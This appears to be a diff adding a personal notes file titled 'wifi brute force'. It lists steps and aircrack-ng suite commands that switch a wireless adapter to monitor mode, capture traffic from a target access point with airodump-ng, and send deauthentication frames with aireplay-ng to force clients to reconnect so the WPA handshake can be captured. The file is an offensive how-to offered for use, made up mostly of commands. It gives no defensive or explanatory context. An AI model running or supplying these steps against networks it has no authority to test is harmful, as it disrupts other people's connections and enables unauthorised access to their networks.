@@ -1,0 +1,20 @@
+
+------>>   wifi brute force
+
+step 1 :  we have to change the wifi adapter manged mode to monitor mode  by using the commands
+step 2 :  then we gonna use airodump-ng
+step 3 : then we will take bssid of the router 
+step 4 : then we deauth the client so that it get's reconnect and we capture the handshake file
+
+
+commands ---->>>>>>>>>>>>
+
+
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+sudo airodump-ng wlan0
+sudo airodump-ng --bssid aa:bb:cc:dd:ee:ff  --channel 1 --write capture wlan0
+sudo aireplay-ng --deauth 10 -a aa:bb:cc:dd:ee:ff  -c aa:bb:cc:dd:ee:ff  wlan0
+
+
